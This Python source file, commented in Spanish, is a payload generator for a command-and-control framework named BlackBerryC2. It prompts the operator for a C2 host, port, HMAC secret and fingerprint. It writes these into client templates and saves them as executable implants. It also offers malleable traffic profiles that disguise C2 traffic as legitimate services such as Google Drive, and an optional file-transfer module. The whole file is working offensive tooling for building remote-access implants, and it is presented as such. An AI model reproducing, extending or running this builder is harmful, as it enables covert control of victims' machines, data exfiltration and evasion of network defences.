#!/usr/bin/env python3

import os, sys, hashlib, re, socket, struct, time

# Perfiles de tráfico malleable
try:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from bb_profiles import list_profiles as _list_profiles, load_profile as _load_profile
    _PROFILES_AVAILABLE = True
except ImportError:
    _PROFILES_AVAILABLE = False
    def _list_profiles(): return {}
    def _load_profile(x): return None

# Directorio donde se encuentra este script (para buscar plantillas)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# ==================== CONFIGURACIÓN DEL SERVIDOR ====================
def get_server_port(override_port=None):
    """Intenta obtener el puerto del servidor importándolo, sino usa default."""
    # Si se proporciona un puerto explícito, usarlo
    if override_port is not None:
        try:
            return int(override_port)
        except (ValueError, TypeError):
            pass
    
    try:
        # Intentar importar del servidor
        import BlackBerryC2_server
        return BlackBerryC2_server.PORT
    except (ImportError, AttributeError):
        # Si no puede importar, usar puerto por defecto
        return 9949

SERVER_FINGERPRINT_PORT = get_server_port()  # Puerto principal del servidor TCP

# ==================== COLORES ====================
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
B_CYAN = "\033[1;96m"
B_GREEN = "\033[1;92m"
B_RED = "\033[1;91m"
B_YELLOW = "\033[1;93m"
ALERT = f"{B_RED}[!]{RESET}"
INFO = f"{B_GREEN}[+]{RESET}"
WARN = f"{B_CYAN}[*]{RESET}"
SUCCESS = f"{B_GREEN}[+]{RESET}"

# ==================== PLANTILLAS ====================
TEMPLATE_FILES = {
    "TCP": "BlackBerryC.py",
    "TLS": "BlackBerryCTLS.py",
    "HTTPS": "BlackBerryCHTTPs.py"
}

def print_banner():
    from banners import PayloadGbanner
    p(PayloadGbanner)

def get_ecdhe_fingerprint_from_server(host, port):
    """
    Obtiene el fingerprint ECDHE conectándose al servidor TCP principal.
    Protocolo: banner → REQUEST_PUBKEY → ECDH_PUBKEY:<pem>
    Fingerprint = SHA256 del PEM completo (igual que el cliente).
    """
    try:
        p(f"{WARN} {CYAN}Conectando a {host}:{port} para obtener fingerprint ECDHE...{RESET}")

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))

        # Recibir banner
        s.recv(1024)

        # Solicitar clave pública ECDHE
        s.sendall(b"REQUEST_PUBKEY")

        # Leer hasta END PUBLIC KEY (igual que el cliente)
        pem_data = b''
        while b'-----END PUBLIC KEY-----' not in pem_data:
            chunk = s.recv(8192)
            if not chunk:
                break
            pem_data += chunk
            if len(pem_data) > 65536:
                break

        s.close()

        if not pem_data.startswith(b'ECDH_PUBKEY:'):
            p(f"{ALERT} {RED}Respuesta inválida del servidor (esperado ECDH_PUBKEY:){RESET}")
            return None

        server_ecdh_pub_pem = pem_data[len(b'ECDH_PUBKEY:'):]

        # Fingerprint = SHA256 del PEM (como en get_ecdhe_fingerprint del cliente)
        sha256_hash = hashlib.sha256(server_ecdh_pub_pem).hexdigest()
        fingerprint = ':'.join(sha256_hash[i:i+2] for i in range(0, len(sha256_hash), 2))

        p(f"{SUCCESS} {GREEN}Fingerprint ECDHE obtenido del servidor{RESET}")
        p(f"{INFO} {CYAN}Puerto: {port}{RESET}")
        return fingerprint

    except socket.timeout:
        p(f"{ALERT} {RED}Timeout conectando al servidor{RESET}")
        return None
    except ConnectionRefusedError:
        p(f"{ALERT} {RED}Conexión rechazada — ¿está el servidor corriendo en {host}:{port}?{RESET}")
        return None
    except Exception as e:
        p(f"{ALERT} {RED}Error obteniendo fingerprint ECDHE: {e}{RESET}")
        return None

def load_template(client_type):
    """Carga la plantilla del cliente especificado desde el directorio del script."""
    template_file = TEMPLATE_FILES.get(client_type)
    
    if not template_file:
        p(f"{ALERT} {RED}Tipo de cliente no válido: {client_type}{RESET}")
        return None
    
    # Buscar plantilla en el directorio del script
    template_path = os.path.join(SCRIPT_DIR, template_file)
    
    if not os.path.isfile(template_path):
        p(f"{ALERT} {RED}Archivo de plantilla no encontrado: {template_file}{RESET}")
        p(f"{INFO} {YELLOW}Buscado en: {template_path}{RESET}")
        p(f"{INFO} {YELLOW}Asegúrate de que las plantillas estén en el directorio del script{RESET}")
        return None
    
    try:
        with open(template_path, 'r', encoding='utf-8') as f:
            content = f.read()
        p(f"{SUCCESS} {GREEN}Plantilla {client_type} cargada exitosamente{RESET}")
        p(f"{INFO} {CYAN}Ruta: {template_path}{RESET}")
        return content
    except PermissionError:
        p(f"{ALERT} {RED}Error: Sin permisos para leer {template_path}{RESET}")
        return None
    except UnicodeDecodeError:
        p(f"{ALERT} {RED}Error: Encoding inválido en {template_path}{RESET}")
        return None
    except Exception as e:
        p(f"{ALERT} {RED}Error cargando plantilla: {e}{RESET}")
        import traceback
        traceback.print_exc()
        return None

def strip_berrytransfer(content):
    """
    Elimina todo el código BerryTransfer del cliente TCP generado,
    dejando únicamente la funcionalidad C2.

    Elimina:
      1. Bloque de funciones BT (BT_CHUNK_SIZE … FIN BERRYTRANSFER)
      2. Argumentos argparse de BT (--sbt / --put / --get / --ls / --dest)
      3. Bloque elif args.berrytransfer: … sys.exit(0)
    """
    # 1. Bloque de funciones BerryTransfer
    content = re.sub(
        r'\nBT_CHUNK_SIZE\s*=.*?# ={5,} FIN BERRYTRANSFER ={5,}[^\n]*\n',
        '\n',
        content,
        flags=re.DOTALL
    )
    # 2. Bloque argparse BerryTransfer
    content = re.sub(
        r'\n    # ── BerryTransfer ─+\n.*?    # ─{5,}\n(?=\n    args = parser\.parse_args)',
        '\n',
        content,
        flags=re.DOTALL
    )
    # 3. Bloque elif args.berrytransfer
    content = re.sub(
        r'    elif args\.berrytransfer:.*?        # ─{5,}\n',
        '',
        content,
        flags=re.DOTALL
    )
    return content


def modify_template(template_content, config):
    """
    Modifica la plantilla con la configuración especificada.

    Args:
        template_content: Contenido de la plantilla
        config: Diccionario con configuración
            - server_host: Host del servidor
            - server_port: Puerto del servidor
            - start_directory: Directorio de inicio
            - verify_fingerprint: Si se verifica fingerprint (bool)
            - fingerprint: Fingerprint ECDHE (str)
            - client_type: Tipo de cliente (TCP/TLS/HTTPS)
            - bt_mode: (solo TCP) "both" | "c2_only"
    """
    modified = template_content

    # ── SERVER_HOST ──────────────────────────────────────────────────────────
    modified = re.sub(
        r'SERVER_HOST\s*=\s*["\'].*?["\']',
        f'SERVER_HOST = "{config["server_host"]}"',
        modified
    )

    # ── PERFIL DE TRÁFICO ────────────────────────────────────────────────────
    if config.get("client_type") == "HTTPS":
        _profile_id = config.get("c2_profile", "gdrive")
        modified = re.sub(
            r'C2_PROFILE\s*=\s*["\'].*?["\'][^\n]*',
            f'C2_PROFILE = "{_profile_id}"   # Configurado por payloadG',
            modified
        )

    # ── SERVER_PORT ──────────────────────────────────────────────────────────
    modified = re.sub(
        r'SERVER_PORT\s*=\s*\d+',
        f'SERVER_PORT = {config["server_port"]}',
        modified
    )

    # ── HMAC PRE-SHARED SECRET ────────────────────────────────────────────────
    hmac_val = config.get("hmac_secret", "")
    if hmac_val:
        # Si es hex guardamos como bytes.fromhex(); si es string como b"..."
        hex_clean = hmac_val.replace(":", "").replace(" ", "")
        if re.match(r'^[0-9a-fA-F]+$', hex_clean) and len(hex_clean) % 2 == 0:
            hmac_repr = f'bytes.fromhex("{hex_clean}")'
        else:
            escaped = hmac_val.replace('\\', '\\\\').replace('"', '\\"')
            hmac_repr = f'b"{escaped}"'
        modified = re.sub(
            r'HMAC_PRE_SHARED_SECRET\s*=\s*b"[^"]*"',
            f'HMAC_PRE_SHARED_SECRET = {hmac_repr}',
            modified
        )

    # ── Fingerprint ECDHE (funciona igual en TCP / TLS / HTTPS) ──────────────
    # Todas las plantillas ya tienen VERIFY_FINGERPRINT y EXPECTED_FINGERPRINT;
    # si por algún motivo no estuvieran las insertamos tras SERVER_PORT.
    if "VERIFY_FINGERPRINT" in modified:
        modified = re.sub(
            r'VERIFY_FINGERPRINT\s*=\s*(True|False)',
            f'VERIFY_FINGERPRINT = {config["verify_fingerprint"]}',
            modified
        )
        modified = re.sub(
            r'EXPECTED_FINGERPRINT\s*=\s*["\'].*?["\']',
            f'EXPECTED_FINGERPRINT = "{config["fingerprint"]}"',
            modified
        )
    else:
        port_match = re.search(r'SERVER_PORT\s*=\s*\d+', modified)
        if port_match:
            insert_pos = port_match.end()
            fp_block = (
                f'\nVERIFY_FINGERPRINT = {config["verify_fingerprint"]}'
                f'\nEXPECTED_FINGERPRINT = "{config["fingerprint"]}"'
            )
            modified = modified[:insert_pos] + fp_block + modified[insert_pos:]

    # ── Directorio de inicio ──────────────────────────────────────────────────
    if "START_DIRECTORY" in modified:
        modified = re.sub(
            r'START_DIRECTORY\s*=\s*["\'].*?["\']',
            f'START_DIRECTORY = "{config["start_directory"]}"',
            modified
        )
    elif re.search(r'os\.chdir\(["\']\/tmp["\']\)', modified):
        modified = re.sub(
            r'os\.chdir\(["\']\/tmp["\']\)',
            f'os.chdir("{config["start_directory"]}")',
            modified
        )

    # ── BerryTransfer mode (solo TCP) ─────────────────────────────────────────
    if config["client_type"] == "TCP" and config.get("bt_mode", "both") == "c2_only":
        p(f"{WARN} {CYAN}Eliminando módulo BerryTransfer (modo Solo C2)...{RESET}")
        modified = strip_berrytransfer(modified)

    return modified

def save_payload(content, output_filename, output_dir=None):
    """
    Guarda el payload generado y le da permisos de ejecución.
    
    Args:
        content: Contenido del payload
        output_filename: Nombre del archivo a crear
        output_dir: Directorio donde guardar (opcional). Si no se proporciona, usa getcwd()
    """
    try:
        # Usar output_dir si se proporciona, sino getcwd()
        target_dir = output_dir if output_dir is not None else os.getcwd()
        output_path = os.path.join(target_dir, output_filename)
        
        p(f"{INFO} {CYAN}Guardando en: {output_path}{RESET}")
        
        # Intentar escribir el archivo
        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(content)
        except PermissionError:
            p(f"{ALERT} {RED}Error: Sin permisos de escritura en {target_dir}{RESET}")
            p(f"{INFO} {YELLOW}Intenta ejecutar desde un directorio con permisos de escritura{RESET}")
            return False
        except IOError as e:
            p(f"{ALERT} {RED}Error de E/S al guardar archivo: {e}{RESET}")
            return False
        
        # Dar permisos de ejecución
        try:
            os.chmod(output_path, 0o755)
        except PermissionError:
            p(f"{WARN} {YELLOW}Advertencia: No se pudieron establecer permisos de ejecución{RESET}")
            p(f"{INFO} {YELLOW}Ejecuta manualmente: chmod +x {output_filename}{RESET}")
        except Exception as e:
            p(f"{WARN} {YELLOW}Advertencia al establecer permisos: {e}{RESET}")
        
        p(f"\n{SUCCESS} {B_GREEN}Payload generado exitosamente: {output_filename}{RESET}")
        return True
        
    except Exception as e:
        p(f"\n{ALERT} {RED}Error inesperado guardando archivo: {e}{RESET}")
        import traceback
        traceback.print_exc()
        return False

def print_summary(config, output_filename):
    """Imprime un resumen de la configuración."""
    W = 51
    p(f"\n{B_CYAN}╔{'═' * W}╗{RESET}")
    p(f"{B_CYAN}║{'  RESUMEN DE CONFIGURACIÓN':^{W}}║{RESET}")
    p(f"{B_CYAN}╠{'═' * W}╣{RESET}")

    def row(label, value, color=CYAN):
        line = f"  {B_GREEN}{label:<22}{RESET} {color}{value}{RESET}"
        p(f"{B_CYAN}║{RESET}{line}")

    row("Tipo de cliente:",  config['client_type'])
    row("Host:",             config['server_host'])
    row("Puerto:",           str(config['server_port']))
    row("Directorio inicio:",config['start_directory'])

    hmac_val = config.get("hmac_secret", "")
    if hmac_val:
        hex_clean = hmac_val.replace(":", "").replace(" ", "")
        if re.match(r'^[0-9a-fA-F]+$', hex_clean) and len(hex_clean) % 2 == 0:
            hmac_disp = f"hex ({len(hex_clean)//2} bytes)"
        else:
            hmac_disp = f"string ({len(hmac_val)} chars)"
        row("HMAC secret:", hmac_disp, GREEN)
    else:
        row("HMAC secret:", "default del servidor", YELLOW)

    if config['client_type'] == "TCP":
        bt = config.get("bt_mode", "both")
        row("BerryTransfer:",
            "C2 + BerryTransfer (--sbt)" if bt == "both" else "Solo C2 (eliminado)",
            GREEN if bt == "both" else YELLOW)

    if config.get("client_type") == "HTTPS" and config.get("c2_profile"):
        try:
            _pr = _load_profile(config["c2_profile"])
            row("Perfil tráfico:", _pr.name if _pr else config["c2_profile"], CYAN)
        except Exception:
            row("Perfil tráfico:", config["c2_profile"], CYAN)

    fp_str = "Habilitada" if config['verify_fingerprint'] else "Deshabilitada"
    fp_color = GREEN if config['verify_fingerprint'] else YELLOW
    row("Fingerprint ECDHE:", fp_str, fp_color)

    if config['verify_fingerprint']:
        fp = config['fingerprint']
        # Mostrar en 2 líneas si es muy largo
        p(f"{B_CYAN}║{RESET}  {B_GREEN}{'Fingerprint:':<22}{RESET} {GREEN}{fp[:W-24]}{RESET}")
        if len(fp) > W - 24:
            p(f"{B_CYAN}║{RESET}  {' ' * 22} {GREEN}{fp[W-24:]}{RESET}")

    p(f"{B_CYAN}╠{'═' * W}╣{RESET}")
    p(f"{B_CYAN}║{RESET}  {B_GREEN}{'Archivo generado:':<22}{RESET} {CYAN}{output_filename}{RESET}")
    p(f"{B_CYAN}║{RESET}  {B_GREEN}{'Ejecutar con:':<22}{RESET} {CYAN}python3 {output_filename}{RESET}")
    p(f"{B_CYAN}╠{'═' * W}╣{RESET}")
    p(f"{B_CYAN}║{RESET}  {B_GREEN}Características:{RESET}")

    features = [
        "Cifrado AES-256-GCM + ECDHE (Perfect Forward Secrecy)",
        "Compresión automática zlib/zstd",
        "Heartbeat automático",
        "Reconexión automática",
        "Modo daemon (--daemon)",
    ]
    if config['client_type'] == "TCP" and config.get("bt_mode", "both") == "both":
        features.append("BerryTransfer integrado (--sbt --put/--get/--ls)")
    if config['verify_fingerprint']:
        features.append("Verificación anti-MITM habilitada")
    if config.get("hmac_secret"):
        features.append("HMAC personalizado configurado")

    for f in features:
        p(f"{B_CYAN}║{RESET}    {SUCCESS} {f}")

    p(f"{B_CYAN}╚{'═' * W}╝{RESET}\n")

def p(msg="", **kw):
    """print() con flush=True garantizado siempre."""
    print(msg, flush=True, **kw)

def _ask(prompt, default=""):
    """
    Muestra el prompt y lee la respuesta.
    Garantiza que TODO lo que estaba en el buffer se imprime antes del prompt.
    """
    sys.stdout.write(prompt)
    sys.stdout.flush()
    try:
        value = sys.stdin.readline()
        if value == "":          # EOF
            return default
        value = value.rstrip("\n\r")
        return value if value else default
    except (KeyboardInterrupt, EOFError):
        return default

def _section(title):
    """Separador visual de sección."""
    bar = "─" * max(0, 45 - len(title))
    p(f"\n{B_CYAN}── {title} {bar}{RESET}")

def get_user_input():
    """Obtiene la configuración del usuario de forma interactiva."""
    config = {}

    # ═══════════════════════════════════════════════════════
    # 1. TIPO DE CLIENTE
    # ═══════════════════════════════════════════════════════
    _section("Tipo de cliente")
    p(f"  {B_GREEN}[1]{RESET} TCP   — conexión directa, sin TLS")
    p(f"  {B_GREEN}[2]{RESET} TLS   — túnel TLS a través de proxy")
    p(f"  {B_GREEN}[3]{RESET} HTTPS — cliente HTTP sobre proxy HTTPS")

    choice = _ask(f"\n  {B_CYAN}Opción [1-3] (Enter = TCP): {RESET}", "1")
    client_types = {"1": "TCP", "2": "TLS", "3": "HTTPS"}
    config["client_type"] = client_types.get(choice, "TCP")
    p(f"  {INFO} Tipo: {B_GREEN}{config['client_type']}{RESET}")

    # ── Perfil de tráfico malleable (solo HTTPS) ──────────────────────────────
    config["c2_profile"] = "gdrive"
    if config["client_type"] == "HTTPS" and _PROFILES_AVAILABLE:
        profiles = _list_profiles()
        profile_keys = list(profiles.keys())
        p(f"")
        p(f"  {B_CYAN}┌─ PERFIL DE TRÁFICO MALLEABLE ──────────────────────────┐{RESET}")
        p(f"  {B_CYAN}│{RESET}  Define User-Agent, URIs, headers e intervalos          {B_CYAN}│{RESET}")
        p(f"  {B_CYAN}│{RESET}  El tráfico C2 parecerá tráfico legítimo del servicio   {B_CYAN}│{RESET}")
        p(f"  {B_CYAN}└────────────────────────────────────────────────────────┘{RESET}")
        p(f"")
        for idx, (pid, pname) in enumerate(profiles.items(), 1):
            try:
                pr = _load_profile(pid)
                desc = pr.description[:44] if pr else ""
            except Exception:
                desc = ""
            p(f"  {B_GREEN}[{idx}]{RESET} {pname:<22} {desc}")
        p(f"")
        gdrive_idx = profile_keys.index("gdrive") + 1 if "gdrive" in profile_keys else 5
        pchoice = _ask(f"  {B_CYAN}Perfil [1-{len(profile_keys)}] (Enter = gdrive): {RESET}", str(gdrive_idx)).strip()
        try:
            pidx = int(pchoice) - 1
            if 0 <= pidx < len(profile_keys):
                config["c2_profile"] = profile_keys[pidx]
        except (ValueError, IndexError):
            pass
        try:
            pr = _load_profile(config["c2_profile"])
            p(f"  {INFO} Perfil: {B_GREEN}{pr.name}{RESET}")
        except Exception:
            p(f"  {INFO} Perfil: {B_GREEN}{config['c2_profile']}{RESET}")

    # ═══════════════════════════════════════════════════════
    # 2. CONEXIÓN
    # ═══════════════════════════════════════════════════════
    _section("Conexión")

    config["server_host"] = _ask(
        f"  {B_CYAN}Host del servidor     (default: localhost): {RESET}", "localhost"
    ) or "localhost"

    default_ports = {"TCP": 9949, "TLS": 9948, "HTTPS": 8443}
    default_port  = default_ports[config["client_type"]]
    auto_port     = get_server_port()
    if config["client_type"] == "TCP" and auto_port != 9949:
        default_port = auto_port
        p(f"  {INFO} Puerto auto-detectado: {CYAN}{default_port}{RESET}")

    port_raw = _ask(
        f"  {B_CYAN}Puerto del servidor   (default: {default_port}): {RESET}", str(default_port)
    )
    try:
        config["server_port"] = int(port_raw) if port_raw else default_port
    except ValueError:
        p(f"  {ALERT} Puerto inválido — usando {default_port}")
        config["server_port"] = default_port

    config["start_directory"] = _ask(
        f"  {B_CYAN}Directorio de inicio  (default: /tmp): {RESET}", "/tmp"
    ) or "/tmp"

    # ═══════════════════════════════════════════════════════
    # 3. MODO BERRYTRANSFER  (solo TCP)
    # ═══════════════════════════════════════════════════════
    config["bt_mode"] = "both"
    if config["client_type"] == "TCP":
        _section("Modo BerryTransfer")
        p(f"  {B_GREEN}[1]{RESET} C2 + BerryTransfer {YELLOW}(por defecto){RESET} — payload completo con --sbt")
        p(f"  {B_GREEN}[2]{RESET} Solo C2             — elimina BerryTransfer (~28KB más ligero)")

        bt = _ask(f"\n  {B_CYAN}Opción [1-2] (Enter = ambos): {RESET}", "1")
        if bt == "2":
            config["bt_mode"] = "c2_only"
            p(f"  {INFO} {GREEN}Solo C2 — BerryTransfer será eliminado del payload{RESET}")
        else:
            config["bt_mode"] = "both"
            p(f"  {INFO} {GREEN}C2 + BerryTransfer — actívalo en tiempo de ejecución con --sbt{RESET}")

    # ═══════════════════════════════════════════════════════
    # 4. SEGURIDAD — HMAC
    # ═══════════════════════════════════════════════════════
    _section("Seguridad — HMAC pre-shared secret")
    p(f"  {YELLOW}Deja en blanco para usar el secret por defecto del servidor{RESET}")
    p(f"  {YELLOW}Formato aceptado: hex (ej. ab12cd...) o string literal{RESET}")

    hmac_raw = _ask(f"\n  {B_CYAN}HMAC secret (Enter = default): {RESET}", "")
    config["hmac_secret"] = ""
    if hmac_raw:
        hex_clean = hmac_raw.replace(":", "").replace(" ", "")
        if re.match(r'^[0-9a-fA-F]+$', hex_clean) and len(hex_clean) % 2 == 0:
            config["hmac_secret"] = hex_clean
            p(f"  {INFO} {GREEN}HMAC configurado como hex ({len(hex_clean)//2} bytes){RESET}")
        else:
            config["hmac_secret"] = hmac_raw
            p(f"  {INFO} {GREEN}HMAC configurado como string literal{RESET}")
    else:
        p(f"  {WARN} {YELLOW}Se usará el HMAC secret por defecto del servidor{RESET}")

    # ═══════════════════════════════════════════════════════
    # 5. SEGURIDAD — FINGERPRINT ECDHE
    # ═══════════════════════════════════════════════════════
    _section("Seguridad — Fingerprint ECDHE")
    p(f"  {YELLOW}Protege contra servidores falsos y ataques MITM{RESET}")

    config["fingerprint"] = ""
    fp_yn = _ask(f"\n  {B_CYAN}¿Habilitar verificación de fingerprint ECDHE? (s/n): {RESET}", "n").lower()
    config["verify_fingerprint"] = fp_yn in ['s', 'si', 'y', 'yes']

    if config["verify_fingerprint"]:
        p(f"\n  {WARN} {CYAN}Método de obtención:{RESET}")
        p(f"    {B_GREEN}[1]{RESET} Auto   — conectar al servidor (host:{config['server_port']})")
        p(f"    {B_GREEN}[2]{RESET} Manual — introducir el fingerprint a mano")
        p(f"  {YELLOW}  Cálculo: SHA256(PEM) de la clave pública ECDHE del servidor{RESET}")

        fp_method = _ask(f"\n  {B_CYAN}Opción [1-2] (Enter = auto): {RESET}", "1")

        if fp_method == "2":
            fp_manual = _ask(f"  {B_CYAN}Fingerprint ECDHE (xx:xx:...): {RESET}", "")
            if re.match(r'^([0-9a-fA-F]{2}:){31}[0-9a-fA-F]{2}$', fp_manual):
                config["fingerprint"] = fp_manual
                p(f"  {INFO} {GREEN}Fingerprint configurado manualmente{RESET}")
            else:
                p(f"  {ALERT} {RED}Formato inválido — verificación deshabilitada{RESET}")
                config["verify_fingerprint"] = False
        else:
            p()
            fingerprint = get_ecdhe_fingerprint_from_server(
                config["server_host"], config["server_port"]
            )
            if fingerprint:
                config["fingerprint"] = fingerprint
                p(f"  {INFO} {GREEN}Fingerprint obtenido: {fingerprint}{RESET}")
            else:
                p(f"  {ALERT} {RED}No se pudo obtener — verificación deshabilitada{RESET}")
                config["verify_fingerprint"] = False

    # ═══════════════════════════════════════════════════════
    # 6. NOMBRE DEL PAYLOAD
    # ═══════════════════════════════════════════════════════
    _section("Nombre del payload")
    custom_name = _ask(f"  {B_CYAN}Nombre (Enter para auto): {RESET}", "")
    if custom_name and not re.match(r'^[a-zA-Z0-9_-]+$', custom_name):
        p(f"  {ALERT} {RED}Nombre inválido — se usará nombre automático{RESET}")
        custom_name = ""
    config["custom_name"] = custom_name or None
    p()
    return config

def generate_payload(server_port=None, output_dir=None):
    """
    Función principal de generación de payloads.
    """
    global SERVER_FINGERPRINT_PORT

    if server_port is not None:
        SERVER_FINGERPRINT_PORT = get_server_port(server_port)
        p(f"{INFO} {CYAN}Puerto del servidor: {SERVER_FINGERPRINT_PORT}{RESET}")

    if output_dir is not None:
        p(f"{INFO} {CYAN}Directorio de salida: {output_dir}{RESET}")

    try:
        print_banner()
        sys.stdout.flush()
    except Exception:
        p(f"{B_CYAN}=== BlackBerry Payload Generator ==={RESET}\n")

    config = get_user_input()

    template_content = load_template(config["client_type"])
    if not template_content:
        return

    p(f"{WARN} {CYAN}Aplicando configuración a la plantilla...{RESET}")
    modified_content = modify_template(template_content, config)

    if config["custom_name"]:
        output_filename = f"{config['custom_name']}_{config['client_type']}.py"
    else:
        output_filename = f"BlackBerryClient_{config['client_type']}_generated.py"

    if save_payload(modified_content, output_filename, output_dir=output_dir):
        print_summary(config, output_filename)

if __name__ == "__main__":
    try:
        # Aceptar puerto y directorio de salida como argumentos de línea de comandos
        import argparse
        parser = argparse.ArgumentParser(description='BlackBerry Payload Generator')
        parser.add_argument('--port', type=int, help='Puerto del servidor BlackBerry')
        parser.add_argument('--output-dir', type=str, help='Directorio donde guardar el payload generado')
        args = parser.parse_args()
        
        generate_payload(server_port=args.port, output_dir=args.output_dir)
    except KeyboardInterrupt:
        p(f"\n{ALERT} {RED}Operación cancelada.{RESET}")
        sys.exit(0)
    except Exception as e:
        p(f"\n{ALERT} {RED}Error inesperado: {e}{RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
